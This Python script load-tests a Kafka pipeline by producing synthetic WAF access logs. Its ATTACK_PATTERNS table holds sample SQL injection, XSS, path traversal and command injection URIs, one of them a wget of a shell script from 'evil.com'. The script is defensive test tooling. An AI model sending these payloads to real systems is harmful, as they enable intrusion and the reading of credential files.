#!/usr/bin/env python3
"""
Script de Carga para Kafka - Inyecta logs sintéticos a Kafka para testing
Objetivo: >= 1000 logs/minuto para reproducir condiciones de carga
"""

import json
import os
import time
import random
import logging
from datetime import datetime
from typing import Dict, Any
from kafka import KafkaProducer
from kafka.errors import KafkaError
import argparse

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


# Patrones de ataques reales para generar logs sintéticos
ATTACK_PATTERNS = {
    "SQLI": [
        "/id=1' OR '1'='1",
        "/user=admin'--",
        "/test=1or%20and%201%20=%201",
        "/search=1' UNION SELECT * FROM users--",
        "/login=admin' OR '1'='1'--",
    ],
    "XSS": [
        "/?q=<script>alert(1)</script>",
        "/?xss=javascript:alert(1)",
        "/?test=<img src=x onerror=alert(1)>",
        "/?payload=<iframe src=javascript:alert(1)>",
    ],
    "PATH_TRAVERSAL": [
        "/?file=../../etc/passwd",
        "/?include=..//..//etc/passwd",
        "/?path=....//....//etc/shadow",
        "/?file=..%2F..%2Fetc%2Fpasswd",
    ],
    "CMD_INJECTION": [
        "/?cmd=;ls",
        "/?exec=|cat /etc/passwd",
        "/?run=`whoami`",
        "/?command=;wget http://evil.com/shell.sh",
    ],
    "OTHER": [
        "/images/workshop.jpg",
        "/assets/js/browser.min.js",
        "/favicon.ico",
        "/api/health",
    ]
}

STATUS_CODES = {
    "blocked": 403,
    "not_found": 404,
    "ok": 200,
    "error": 500,
}

IPS = [
    "YOUR_IP_ADDRESS",
    "YOUR_IP_ADDRESS",
    "YOUR_IP_ADDRESS",
    "YOUR_IP_ADDRESS",
    "YOUR_IP_ADDRESS",
]


def generate_log(attack_type: str = None, blocked: bool = None) -> Dict[str, Any]:
    """
    Genera un log sintético con estructura realista.
    
    Args:
        attack_type: Tipo de ataque (SQLI, XSS, PATH_TRAVERSAL, CMD_INJECTION, OTHER)
        blocked: Si fue bloqueado (None = aleatorio)
    
    Returns:
        Dict con estructura de log del WAF
    """
    if attack_type is None:
        attack_type = random.choice(list(ATTACK_PATTERNS.keys()))
    
    if blocked is None:
        # 70% de ataques bloqueados, 30% permitidos
        blocked = random.random() < 0.7 if attack_type != "OTHER" else random.random() < 0.1
    
    pattern = random.choice(ATTACK_PATTERNS[attack_type])
    ip = random.choice(IPS)
    
    # Determinar status code
    if blocked:
        status = STATUS_CODES["blocked"]
    elif attack_type == "OTHER":
        status = random.choice([STATUS_CODES["ok"], STATUS_CODES["not_found"]])
    else:
        status = random.choice([STATUS_CODES["ok"], STATUS_CODES["not_found"], STATUS_CODES["error"]])
    
    # Timestamp actual
    timestamp = datetime.utcnow().strftime("%d/%b/%Y:%H:%M:%S +0000")
    
    log = {
        "ip": ip,
        "date": timestamp,
        "timestamp": timestamp,
        "method": random.choice(["GET", "POST", "PUT", "DELETE"]),
        "uri": pattern,
        "path": pattern.split("?")[0] if "?" in pattern else pattern,
        "query_string": pattern.split("?")[1] if "?" in pattern else "",
        "status": status,
        "size": random.randint(100, 5000),
        "referer": random.choice(["", "http://example.com", "-"]),
        "user_agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "python-requests/2.32.5",
            "curl/7.68.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        ]),
        "blocked": blocked,
        "threat_type": attack_type if attack_type != "OTHER" else None,
        "severity": "high" if attack_type != "OTHER" and blocked else ("medium" if attack_type != "OTHER" else "low"),
        "format": "nginx_access"
    }
    
    return log


def load_test_kafka(
    kafka_bootstrap: str,
    topic: str,
    rate_per_second: int = 20,  # 20 logs/s = 1200 logs/min
    duration_seconds: int = 60,
    attack_distribution: Dict[str, float] = None
):
    """
    Inyecta logs a Kafka a una tasa específica.
    
    Args:
        kafka_bootstrap: Bootstrap servers de Kafka
        topic: Topic donde enviar logs
        rate_per_second: Logs por segundo a generar
        duration_seconds: Duración del test en segundos
        attack_distribution: Distribución de tipos de ataque (ej: {"SQLI": 0.3, "XSS": 0.2, ...})
    """
    if attack_distribution is None:
        attack_distribution = {
            "SQLI": 0.25,
            "XSS": 0.25,
            "PATH_TRAVERSAL": 0.15,
            "CMD_INJECTION": 0.15,
            "OTHER": 0.20,
        }
    
    logger.info(f"🚀 Iniciando load test de Kafka")
    logger.info(f"   Topic: {topic}")
    logger.info(f"   Rate: {rate_per_second} logs/s ({rate_per_second * 60} logs/min)")
    logger.info(f"   Duración: {duration_seconds}s")
    logger.info(f"   Total esperado: {rate_per_second * duration_seconds} logs")
    
    # Inicializar producer
    try:
        producer = KafkaProducer(
            bootstrap_servers=kafka_bootstrap.split(','),
            value_serializer=lambda v: json.dumps(v).encode('utf-8'),
            acks=1,  # Esperar confirmación de al menos 1 replica
            retries=3,
            batch_size=16384,
            linger_ms=10,
            compression_type='gzip',
        )
        logger.info("✅ Kafka producer inicializado")
    except Exception as e:
        logger.error(f"❌ Error inicializando Kafka producer: {e}")
        return
    
    # Métricas
    logs_sent = 0
    logs_failed = 0
    start_time = time.time()
    interval_start = start_time
    
    # Calcular intervalo entre mensajes
    interval = 1.0 / rate_per_second
    
    try:
        while time.time() - start_time < duration_seconds:
            # Seleccionar tipo de ataque según distribución
            rand = random.random()
            cumulative = 0
            attack_type = "OTHER"
            for atype, prob in attack_distribution.items():
                cumulative += prob
                if rand <= cumulative:
                    attack_type = atype
                    break
            
            # Generar log
            log = generate_log(attack_type=attack_type)
            
            # Enviar a Kafka
            try:
                future = producer.send(topic, value=log)
                # No esperar confirmación inmediata (async)
                logs_sent += 1
            except Exception as e:
                logger.error(f"Error enviando log: {e}")
                logs_failed += 1
            
            # Log cada segundo
            current_time = time.time()
            if current_time - interval_start >= 1.0:
                elapsed = current_time - start_time
                actual_rate = logs_sent / elapsed if elapsed > 0 else 0
                logger.info(f"📊 {logs_sent} logs enviados ({actual_rate:.1f} logs/s, {logs_failed} fallos)")
                interval_start = current_time
            
            # Control de tasa: esperar intervalo
            time.sleep(interval)
        
        # Flush final
        producer.flush(timeout=10)
        logger.info("✅ Flush completado")
        
    except KeyboardInterrupt:
        logger.info("⏹️  Test interrumpido por usuario")
        producer.flush(timeout=10)
    except Exception as e:
        logger.error(f"❌ Error durante load test: {e}", exc_info=True)
    finally:
        producer.close()
        
        # Estadísticas finales
        total_time = time.time() - start_time
        final_rate = logs_sent / total_time if total_time > 0 else 0
        logger.info("=" * 60)
        logger.info("📊 ESTADÍSTICAS FINALES")
        logger.info(f"   Logs enviados: {logs_sent}")
        logger.info(f"   Logs fallidos: {logs_failed}")
        logger.info(f"   Tiempo total: {total_time:.2f}s")
        logger.info(f"   Tasa promedio: {final_rate:.2f} logs/s ({final_rate * 60:.0f} logs/min)")
        logger.info(f"   Tasa objetivo: {rate_per_second} logs/s ({rate_per_second * 60} logs/min)")
        logger.info("=" * 60)


def main():
    parser = argparse.ArgumentParser(description="Load test de Kafka para WAF logs")
    parser.add_argument(
        "--kafka-bootstrap",
        default=os.getenv("KAFKA_BOOTSTRAP_SERVERS", "localhost:9092"),
        help="Bootstrap servers de Kafka (default: KAFKA_BOOTSTRAP_SERVERS env var o localhost:9092)"
    )
    parser.add_argument(
        "--topic",
        default=os.getenv("KAFKA_TOPIC_WAF_LOGS", "waf-logs"),
        help="Topic de Kafka (default: KAFKA_TOPIC_WAF_LOGS env var o waf-logs)"
    )
    parser.add_argument(
        "--rate",
        type=int,
        default=20,
        help="Logs por segundo (default: 20 = 1200 logs/min)"
    )
    parser.add_argument(
        "--duration",
        type=int,
        default=60,
        help="Duración en segundos (default: 60)"
    )
    
    args = parser.parse_args()
    
    load_test_kafka(
        kafka_bootstrap=args.kafka_bootstrap,
        topic=args.topic,
        rate_per_second=args.rate,
        duration_seconds=args.duration
    )


if __name__ == "__main__":
    main()









